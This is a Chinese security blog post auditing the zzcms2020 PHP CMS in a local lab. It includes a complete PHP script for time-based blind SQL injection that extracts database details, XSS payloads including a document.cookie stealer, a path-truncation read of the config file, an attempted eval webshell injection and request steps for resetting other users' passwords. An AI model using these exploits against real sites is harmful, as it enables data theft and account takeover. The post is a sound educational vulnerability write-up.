> 原文链接: https://www.anquanke.com//post/id/224596 


# php代码审计初探-zzcms


                                阅读量   
                                **202256**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01d01534c3c31ff646.jpg)](https://p5.ssl.qhimg.com/t01d01534c3c31ff646.jpg)



年中左右公司开始注重网络安全相关了，搞了一个src（还没对外开放），先内部鼓励大家多多提交。部门交叉审计其他项目组的代码，找出可能的问题。其实也就是代码安全审计。我虽是开发，但是也一直对安全挺感兴趣的。<br>
这段时间也找出了公司远古项目的一些问题，借此，想简单分享一下关于代码审核的一些经验。

公司的项目当然不可以分享的，另外代码在内网也拿不出来[![](https://p3.ssl.qhimg.com/t0177bd20bfc049e96f.png)](https://p3.ssl.qhimg.com/t0177bd20bfc049e96f.png)

首先，本地环境搭好，家里台式机安装了 vmware ，上面安装了 centos+Kali<br>
centos是大部分服务器首选的操作系统<br>
Kali是安全人员喜欢用的，上面可操作的工具很多，大家可以百度、下载下来尝试一下

前段时间测试一些环境方面的类库，把centos 搞挂了，今天就在本地演示一下<br>
下载 phpstudy (官方地址：[http://www.phpstudy.net/](http://www.phpstudy.net/)) 这个是 windows版本 lamp/lnmp环境，linux+apache(nginx)+MySQL+php

下载安装好之后运行起来，大概长这样（版本不同会有所差异）

[![](https://p4.ssl.qhimg.com/t01fc3ff102fba445d6.png)](https://p4.ssl.qhimg.com/t01fc3ff102fba445d6.png)

这次我们审计的是 zzcms，网上之前可能出现过zzcms的代码审核相关文档，我们百度一下，随便找了俩篇，可以看一下 ，不过这些都是 都是之前的版本，

[https://www.freebuf.com/articles/web/230282.html](https://www.freebuf.com/articles/web/230282.html)

[![](https://p5.ssl.qhimg.com/t0117ac056e87a2238d.png)](https://p5.ssl.qhimg.com/t0117ac056e87a2238d.png)

[https://www.cnblogs.com/dfy-blog/p/13782712.html](https://www.cnblogs.com/dfy-blog/p/13782712.html)

[![](https://p1.ssl.qhimg.com/t01c0ba51ea6dc946f4.png)](https://p1.ssl.qhimg.com/t01c0ba51ea6dc946f4.png)

我们去zzcms官网看一下（[http://www.zzcms.net）](http://www.zzcms.net%EF%BC%89) 翻一下版本历史，我们发现其实这个cms（内容管理系统，content manage system）还是在维护的，v8.2 还是 17年的版本

[![](https://p5.ssl.qhimg.com/t014b38dcd5997cc606.png)](https://p5.ssl.qhimg.com/t014b38dcd5997cc606.png)

这次我们下载最新的版本，他现在这个 命名方式换了，最新版叫 zzcms2020

[![](https://p4.ssl.qhimg.com/t01c77835512f90d8d9.png)](https://p4.ssl.qhimg.com/t01c77835512f90d8d9.png)

下载解压之后，放到phpstudy WEB 目录。这里我们看到，他项目根目录下面有个nginx.conf ，是 关于伪静态相关的一个处理

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010ab094016e75200a.png)

我们把这些拷贝到我们配置的zzcms.conf里面，简单配置一下，大概如下

```
server `{`
    listen       80;
    server_name  www.zzcms.local;

    access_log  logs/zzcms.access.log  main;
    root   "D:/phpStudy/WWW/zzcms2020";
    location / `{`
        index  index.html index.htm index.php;
       autoindex  off;
    `}`

    rewrite /default.htm$ /zt/show.php;
    rewrite ^/index.htm$ /index.php;
    rewrite /(zs|dl)/index.htm$ /$1/index.php;
    rewrite /area/([0-9,a-z]*).htm$ /area/show.php?province=$1;
    rewrite ^/zsclass/([0-9,a-z]*).htm$ /zsclass/class.php?b=$1;
    rewrite ^/zsclass/([0-9,a-z]*)$ /zsclass/zsclass.php?b=$1;
    rewrite ^/zsclass/([0-9,a-z]*)/([0-9]+).htm$ /zsclass/zsclass.php?b=$1&amp;page=$2;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/index.htm$ /$1/index.php;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask).htm$ /$1/$1.php;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/([0-9]+).htm$ /$1/$1.php?page=$2;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/([0-9,a-z]*)$ /$1/$1.php?b=$2;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/([0-9,a-z]*)/([0-9]+).htm$ /$1/$1.php?b=$2&amp;page=$3;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/([0-9,a-z]*)/([0-9,a-z]*)$ /$1/$1.php?b=$2&amp;s=$3;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask)/([0-9,a-z]*)/([0-9,a-z]*)/([0-9]+).htm$ /$1/$1.php?b=$2&amp;s=$3&amp;page=$4;
    rewrite /(zs|dl|zx|special|company|pp|zh|job|wangkan|baojia|ask|zt)/show-([0-9]+).htm$ /$1/show.php?id=$2;
    rewrite /(zx|special)/class/([0-9]+)$ /$1/class.php?b=$2;
    rewrite /(zx|special)/show-([0-9]+)-([0-9]+).htm$ /$1/show.php?id=$2&amp;page=$3;
    rewrite /(help|link|sitemap).htm$ /one/$1.php;
    rewrite /siteinfo-([0-9]+).htm$ /one/siteinfo.php?id=$1;
    rewrite /(reg|user|zs)/([0-9,a-z]*).htm$ /$1/$2.php;
    rewrite /sell/zsshow-([0-9]+).htm$ /zt/zsshow.php?cpid=$1;
    rewrite /sell$ /zt/zs.php;
    rewrite /sell/zs-([0-9]+).htm$ /zt/zs.php?id=$1;
    rewrite /sell/zs-([0-9]+)-([0-9,a-z,A-Z]*).htm$ /zt/zs.php?id=$1&amp;bigclass=$2;
    rewrite /sell/zs-([0-9]+)-([0-9,a-z,A-Z]*)-([0-9,a-z,A-Z]*).htm$ /zt/zs.php?id=$1&amp;bigclass=$2&amp;smallclass=$3;
    rewrite /sell/zs-([0-9]+)-([0-9,a-z,A-Z]*)-([0-9,a-z,A-Z]*)-([0-9]+).htm$ /zt/zs.php?id=$1&amp;bigclass=$2&amp;smallclass=$3&amp;page=$4;
    rewrite /brand$ /zt/pp.php;
    rewrite /brand/pp-([0-9]+).htm$ /zt/pp.php?id=$1;
    rewrite /brand/pp-([0-9]+)-([0-9]+).htm$ /zt/pp.php?id=$1&amp;page=$2;
    rewrite /brand/ppshow-([0-9]+).htm$ /zt/ppshow.php?cpid=$1;
    rewrite /jobs$ /zt/job.php;
    rewrite /jobs/job-([0-9]+).htm$ /zt/job.php?id=$1;
    rewrite /jobs/job-([0-9]+)-([0-9]+).htm$ /zt/job.php?id=$1&amp;page=$2;
    rewrite /jobs/jobshow-([0-9]+).htm$ /zt/jobshow.php?cpid=$1;
    rewrite /introduce$ /zt/companyshow.php;
    rewrite /introduce/companyshow-([0-9]+).htm$ /zt/companyshow.php?id=$1;
    rewrite /contact$ /zt/contact.php?id=$1;
    rewrite /contact/contact-([0-9]+).htm$ /zt/contact.php?id=$1;
    rewrite /licence$ /zt/licence.php;
    rewrite /licence/licence-([0-9,a-z]*).htm$ /zt/licence.php?id=$1;
    rewrite /guestbook$ /zt/liuyan.php;
    rewrite /guestbook/liuyan-([0-9,a-z]*).htm$ /zt/liuyan.php?id=$1;
    rewrite /news$ /zt/news.php;
    rewrite /news/$ /zt/news.php;
    rewrite /news/news-([0-9]+).htm$ /zt/news.php?id=$1;
    rewrite /news/news-([0-9]+)-([0-9]+).htm$ /zt/news.php?id=$1&amp;page=$2;
    rewrite /news/newsshow-([0-9]+).htm$ /zt/newsshow.php?newsid=$1;

    location ~ \.php(.*)$  `{`
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_split_path_info  ^((?U).+\.php)(/?.+)$;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        fastcgi_param  PATH_INFO  $fastcgi_path_info;
        fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;
        include        fastcgi_params;
    `}`
`}`
```

访问首页是这样，需要安装一下

[![](https://p3.ssl.qhimg.com/t0137ff222ea7df903e.png)](https://p3.ssl.qhimg.com/t0137ff222ea7df903e.png)

安装成功

[![](https://p0.ssl.qhimg.com/t012630c53abcd08d6f.png)](https://p0.ssl.qhimg.com/t012630c53abcd08d6f.png)

我们可以看简单看一下源码，我们发现并没有用什么框架，也没有遵循 MVC 设计模式，具体模块无单一入口，完全是 面向过程 开发的。<br>
nginx访问路径只能指到项目根目录下面。到处都是入口，所以，这样很难控制流量的访问，我可以访问项目任意文件，其实有些文件我是不希望外部访问的

大概阅读一下源码，我们可以发现，他真的很‘简单’，前端提交的数据，提交到后台，后台处理一下直接入库，或者直接查询数据库给前端展示，中间cache什么的，都没有，也没有啥复杂逻辑<br>
项目的 inc/ 目录是配置相关的，几乎每个访问路径都会包含 inc/conn.php，我们进去看一下,发现他包含了

```
include(zzcmsroot."/inc/config.php");
include(zzcmsroot."/inc/wjt.php");
include(zzcmsroot."/inc/function.php");
include(zzcmsroot."/inc/zsclass.php");//分类招商在里面
include(zzcmsroot."/inc/stopsqlin.php");
include(zzcmsroot."/inc/area.php");
```

主要的几个文件，大致如下：<br>
inc/config.php 是项目所用常量的定义集合，里面也包含了数据库等敏感信息

[![](https://p3.ssl.qhimg.com/t01eb3c9a5dfb505da3.png)](https://p3.ssl.qhimg.com/t01eb3c9a5dfb505da3.png)

inc/function.php 是常用函数的一些封装

inc/stopsqlin.php 相当于 防火墙，是入口流量 统一处理相关的，检测危险字符

[![](https://p2.ssl.qhimg.com/t01e01ba0419a7fc2ed.png)](https://p2.ssl.qhimg.com/t01e01ba0419a7fc2ed.png)

这里我们可以看到，最新版 ，他基本上过滤检测了前端提交数据的所有方法。<br>
$_COOKIE、$_POST、$_GET 递归转义了所有的单引号或者双引号<br>
$_COOKIE、$_POST、$_GET、$_REQUEST 判断了是否含有危险字符，如下：

`select|update|and|delete|insert|truncate|char|into|iframe|script`

主要是防止sql注入。<br>
这里有点蛋疼，想 联合查询 union select 直接把数据回显到页面上无法实现了。

同样道理，报错注入也不行，另外页面错误显示也没打开，这是符合常理的，一般只有开发或者测试环境会打开报错

项目里面sql查询是很多，但是查询条件基本上都是字符串类型的，例如<br>`Select * From zzcms_help where id='$id'`<br>
这样我们无法闭合单引号或者双引号，布尔盲注什么的，也就操作不了。

sql注入好像行不通，换个其他的看看吧<br>
我们先简单搜索一下，执行命令相关的函数，比如 `exec\system\passthru\popen`等，发现一个都没有。好吧，，

文件读取相关的（`fread\file_get_contents\fopen\file等`），如果可以任意文件读取，倒是直接读取inc/condfig.php，把数据库相关敏感信息读取出来，我们全局搜一下，，，

[![](https://p4.ssl.qhimg.com/t01ddb343ccaccefceb.png)](https://p4.ssl.qhimg.com/t01ddb343ccaccefceb.png)

类似于这种最后拼接是变量的，我们点进去看一下，看一下变量是否可控，可控的话，一切好说<br>
很遗憾，并没有找到可以操作的地方，都直接限制死了。事实上，整个项目都是如此，看作者过滤时的备注，肯定也意识到此类操作的危险性。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017883fef7a11e068b.png)

关于这种的

[![](https://p2.ssl.qhimg.com/t01bc3fd183f00ba050.png)](https://p2.ssl.qhimg.com/t01bc3fd183f00ba050.png)

这里简单说一下，页面的 $siteskin 貌似没有定义，其实不是，可以看一下<br>
/inc/conn.php 里面包含的 /inc/stopsqlin.php 文件。里面有这么一段操作

```
if($_REQUEST)`{`
    $_POST =zc_check($_POST);
    $_GET =zc_check($_GET);
    @extract($_POST);
    @extract($_GET);    
`}`
```

所以，可以 $_GET[‘siteskin’] 或者 $_POST[‘siteskin’] 传过来，其他文件也相同原理

言归正传，操作系统对文件名有长度的限制，据说如果我们的$_GET[‘siteskin’]超过这个长度限制，那么最后面的 “/area_show.htm” 就会失效。<br>`利用方法：http://www.zzcms.local/area/show.php`<br>`POST : siteskin= test.txt/../inc/config.php/./././././././././././././././././././......(超过一定数量的./)  但是这个我之前在linux上试过，好像不行，据说某些版本的linux支持。windows上没试过，大家有兴趣可以试一下（手动滑稽）`

文件写入相关的（`fwrite\file_put_contents 等`），我们看一下有没有可以写入的地方，，，找了一下，也并没有

图片上传那里，之前版本对文件后缀的过滤是采用黑名单机制，黑名单内不能上传，其他都可以上传，黑名单不全导致恶意文件传上去了，什么phtml文件等，`但是现在 采用白名单机制了，比如图片，我只允许 gif、bmp、jpg、png 这四种`。其他都非法，这样限制死了，也没办法了

[![](https://p3.ssl.qhimg.com/t0131c9959d0d6a7311.png)](https://p3.ssl.qhimg.com/t0131c9959d0d6a7311.png)

之前的getip()我们看一下，最新版已经无法利用了

```
function getip()`{` 
    if (getenv("HTTP_CLIENT_IP") &amp;&amp; strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) `{`
    $ip = getenv("HTTP_CLIENT_IP");
    `}`else if (getenv("HTTP_X_FORWARDED_FOR") &amp;&amp; strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) `{`
    $ip = getenv("HTTP_X_FORWARDED_FOR"); 
    `}`else if (getenv("REMOTE_ADDR") &amp;&amp; strcasecmp(getenv("REMOTE_ADDR"), "unknown")) `{`
    $ip = getenv("REMOTE_ADDR"); 
    `}`else if (isset($_SERVER['REMOTE_ADDR']) &amp;&amp; $_SERVER['REMOTE_ADDR'] &amp;&amp; strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))`{` 
    $ip = $_SERVER['REMOTE_ADDR']; 
    `}`else`{`
    $ip = "unknown";
    `}`
    if (check_isip($ip)==false)`{`
    $ip = "unknown";
    `}`
    return($ip); 
`}`
.....
function check_isip($str)
`{`
  if (preg_match("/^[\d]`{`2,3`}`\.[\d]`{`1,3`}`\.[\d]`{`1,3`}`\.[\d]`{`1,3`}`$/", $str))
    return true;
  return false;
`}`
```

`check_isip() 对ip地址做了正则判断`

xss的话，一个反射型触发点是 ask/top.php，这里作者没修复，我们简单触发一下，伪造post请求：<br>`action=search&amp;lb=#'&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;script&gt;location.href='zx&amp;keyword=11`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0104dc16d809e00d08.png)

他可能觉得危害性不大，其实之前版本暴露出来的问题，基本上都已经修复了。说明作者其实也在关注这方面。这里不好评价危害性大不大。存储性xss，暂时前台还没有找到

这样，好像陷入了死胡同，我们再回头看一下 inc/stopsqlin.php 这个文件，我们发现没有过滤 or ，这里好像可以利用。我们需要找一个 查询条件是int类型的，不带单引号或双引号。我们全局搜一下，，，<br>
找到了2处，在 user/adv2.php 这个文件里面

[![](https://p2.ssl.qhimg.com/t01efb2c5d5bae3484e.png)](https://p2.ssl.qhimg.com/t01efb2c5d5bae3484e.png)

这样，我们可以假设这样查询：<br>`select * from zzcms_ad where id=9999 or if (4=length(user()),sleep(3),null)`<br>
我们看一下需要怎样才能先把流程走到这里

我们先看一下入口

[![](https://p2.ssl.qhimg.com/t013571d1583f62477e.png)](https://p2.ssl.qhimg.com/t013571d1583f62477e.png)

这里加一条打印信息。

[![](https://p1.ssl.qhimg.com/t01621a8ddcf4a73fbe.png)](https://p1.ssl.qhimg.com/t01621a8ddcf4a73fbe.png)

我们看一下 setAdv 方法入口那里，第一行申明的应该是有问题的<br>`global $f_array,$Username;`

PHP 变量是区分大小写的，他的方法名是不区分大小写的，比如 Exit() exIt() Echo echo 都是ok的。

这里 $Username 全篇没有用到，用到的 $username 用到却没有定义，注意，这是方法里面，不用 global申明，外面相同名称的变量拿不进来。

可以这样访问 `http://www.zzcms.local/user/adv2.php/action=modify`<br>
这里是user模块，我们需要注册一下用户，`我们先注册 usertest1 : usertest1`<br>
访问 返回 ‘个人用户不能抢占广告位’<br>`我们重新注册一下，选择 公司 用户，usertest2 : usertest2`<br>
访问上面地址，提示需要添加一个产品和一条广告，按照他提示跳转去新增一下<br>
（这里要注意，必须要保证 zzcms_ad 表里面有数据，管理后台添加的）

我们这样提交一下

[![](https://p0.ssl.qhimg.com/t019e7b993848f1cbe3.png)](https://p0.ssl.qhimg.com/t019e7b993848f1cbe3.png)

我们看一下返回时间

[![](https://p0.ssl.qhimg.com/t01485f35fe033187dd.png)](https://p0.ssl.qhimg.com/t01485f35fe033187dd.png)

是延迟了三秒。OK，没问题，，

我们之前登陆的相关信息，是保存在cookie里面的，可以看到

[![](https://p1.ssl.qhimg.com/t010b17cf42c3d2cc3c.png)](https://p1.ssl.qhimg.com/t010b17cf42c3d2cc3c.png)

vm不是有点问题么，我们也不用sqlmap了，我们简单写个脚本把他信息跑出来。

```
&lt;?php
/**
 * 基于时间的盲住
 * @author uncle-w
 * @date   2020-11-30 14:52
 */

// 本地host配置：127.0.0.1 www.zzcms.local
$url      = 'http://www.zzcms.local/user/adv2.php?action=modify';
$sleep    = 2;
$upNum    = 50;
$asciiNum = 127;

$dbname = getLocalDBName();
echo "Local Dbname : $dbname\n";

$username = getLocalUserName();
echo "Local User : $username\n";

$version = getVersionName();
echo "Local DbVersion : $version\n";


echo "Local Dbname : $dbname\n";
echo "Local User : $username\n";
echo "Local DbVersion : $version\n";

/**
 * 获取database信息
 * @return string
 */
function getLocalDBName()
`{`
    return getInfoByType('database');
`}`

/**
 * 获取当前连接用户信息
 * @return string
 */
function getLocalUserName()
`{`
    return getInfoByType('user');
`}`

/**
 * 获取数据库版本信息
 * @return string
 */
function getVersionName()
`{`
    return getInfoByType('version');
`}`

/**
 * 循环提交
 * @param  string $type 类别
 * @return string
 */
function getInfoByType($type)
`{`
    global $sleep,$upNum,$asciiNum;
    $length = 0;
    for ($i = 1; $i &lt; $upNum; $i++) `{`
        $uid      = '9999 or if(length(' . $type . '())=' . $i . ',sleep(' . $sleep . '),null)';
        $httpInfo = sendRequest($uid);
        if ($httpInfo['total_time'] &gt; $sleep) `{`
            $length = $i;
            break;
        `}`
        usleep(300000);
    `}`
    echo "$type Length : $length \n";
    $result = '';
    for ($i = 1; $i &lt;= $length; $i++) `{`
        for ($j = 32; $j &lt; $asciiNum; $j++) `{`
            $uid = '999 or if(ascii(substr(' . $type . '(),' . $i . ',1))=' . $j
            . ',sleep(' . $sleep . '),null)';
            $httpInfo = sendRequest($uid);
            if ($httpInfo['total_time'] &gt; $sleep) `{`
                $result .= chr($j);
                break;
            `}`
            usleep(300000);
        `}`
    `}`
    return $result;
`}`

/**
 * 发送请求
 * @return array
 */
function sendRequest($uid)
`{`
    global $url;
    $cookie  = 'UserName=usertest2;PassWord=5bc3f442e2128b2fffd90dfb9d59d701';
    $chandle = curl_init($url);
    curl_setopt($chandle, CURLOPT_HTTPHEADER, array('Connection: Keep-Alive',));
    curl_setopt($chandle, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0');
    curl_setopt($chandle, CURLOPT_TIMEOUT, 20);
    curl_setopt($chandle, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($chandle, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($chandle, CURLOPT_POST, 1);
    curl_setopt($chandle, CURLOPT_POSTFIELDS, 'id=' . $uid);
    curl_setopt($chandle, CURLOPT_COOKIE,  $cookie);
    curl_exec($chandle);
    $httpInfo = curl_getinfo($chandle);
    curl_close($chandle);
    if ($httpInfo) `{`
        echo 'Request Consume Time :' . $httpInfo["total_time"] . "\n";
        return $httpInfo;
    `}`
`}`

```

可以看到，数据其实是跑出来了

[![](https://p3.ssl.qhimg.com/t010d07d46659003058.png)](https://p3.ssl.qhimg.com/t010d07d46659003058.png)

最后结果：

[![](https://p2.ssl.qhimg.com/t015360e648b90a54af.png)](https://p2.ssl.qhimg.com/t015360e648b90a54af.png)

除了这个注入之外，我们再看一下还有没有其他问题，我们重点看一下用户中心模块的相关的逻辑和代码。<br>`我们发现竟然可以重置他人的密码。`我们注册一个 usertest3 : usertest3 (用户名：密码)`<br>
之前我们注册的 usertest1 : usertest1。

```
我们以  usertest3  重置  usertest1 的密码
```

我们点击 找回密码，这里输入 usertest1

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012bed266cf9bb4f15.png)

点击下一步

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01513f4c171dec1c49.png)

这个页面我们看一下代码 /one/getpassword.php<br>
我们发现他是用 action 来控制流程的，在 $action==”step3” 会进入更新密码流程

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a7ee8baa38e27408.png)

这里需要 满足三个条件<br>`A . $action == "step3"`<br>`B . @$_SESSION['username'] != ''`<br>`C . @$_POST['yzm_mobile'] == @$_SESSION['yzm_mobile']`

A没问题，直接 `$_POST['action'] = 'step3'`就OK<br>
B的话，我们看一下，如何让 `$_SESSION['username'] 有值不为空`，我们搜一下，发现就在这个文件，当 `$_POST['action'] = 'step1'`，就给他赋值了，，，，

[![](https://p0.ssl.qhimg.com/t01cea6b7bf8f6c1dcc.png)](https://p0.ssl.qhimg.com/t01cea6b7bf8f6c1dcc.png)

我们只需要访问这个地址 [http://www.zzcms.local/one/getpassword.php](http://www.zzcms.local/one/getpassword.php)<br>`POST：action=step1&amp;username=usertest1`

`即可把 $username 赋值给  $_SESSION['username']`，让它不为空

C 的话，我们看一下这个手机验证码哪里触发的，我们全局搜一下 yzm_mobile

[![](https://p3.ssl.qhimg.com/t01cd896db838d3bd8e.png)](https://p3.ssl.qhimg.com/t01cd896db838d3bd8e.png)

我们发现跟赋值相关的，只有 红框里面的俩个文件，我们分别点进去看一下<br>`关于这个文件 /ajax/dladd_send_yzm_ajax.php`

```
$mobile=$_GET['id'];
$yzm=rand(100000,999999);
$_SESSION['yzm_mobile']=$yzm;
```

好家伙，直接赋值了，，，这是要干嘛<br>
然后调用短信接口 sendSMS 方法发送，这里我们直接把信息输出，就不发送了

另外一个文件 /ajax/send_yzm_ajax.php 稍微复杂一点点，大家可以自行研究一下

所以，流程很清除了，我们先B ，设置 $_SESSION[‘username’]，再 C，设置 $_SESSION[‘yzm_mobile’]。最后 A ，POST 提交数据

`POST：action=step3&amp;yzm_mobile=刚刚拿到的验证码&amp;password=xxxxx`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f87a9b8bbace6964.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0192bc55114283273d.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017316eabc4ea3d5de.png)

其他方面的，也暂时没发现了。最新版，我们安装成功之后，系统也没有提示我们删除 install 目录下面的敏感文件，我们看了一下，之前版本的 系统重装漏洞也依然存在。

我们可以直接 $_POST[‘step’] = 3 进入第三步骤，这里有个赋值的操作

```
  $token = md5(uniqid(rand(), true));
  $_SESSION['token']= $token;
```

必须要先第三步，后面第四步才不会报错，因为他检测了这个 $_SESSION[‘token’]。填写上账号密码，我们到第五步。<br>
第五步这里，把数据库参数定义成常量，写到 inc/config.php 文件里面

[![](https://p2.ssl.qhimg.com/t0115a7e418c17a697a.png)](https://p2.ssl.qhimg.com/t0115a7e418c17a697a.png)

这里本来可以 写入一句话webshell的，预期提交的数据<br>`$_POST['url'] = http://www.zzcms.local');eval($_POST['cmd']);//`

但是 因为他 处理了单引号，导致写进去的数据无法闭合单引号，无法生成 webshell，有点遗憾。不过这里可以插入<br>`$_POST['url'] = &lt;script&gt;alert(document.cookie)&lt;/script&gt;`<br>
那就是 存储型 xss 了

其他的什么的，好像也没有啥了，这次先到这里吧！<br>
小白在一起交流交流。大牛勿鄙视。<br>
以后有时间再接着探讨！谢谢！

[![](https://p1.ssl.qhimg.com/t01659dbb8ea91375b3.png)](https://p1.ssl.qhimg.com/t01659dbb8ea91375b3.png)
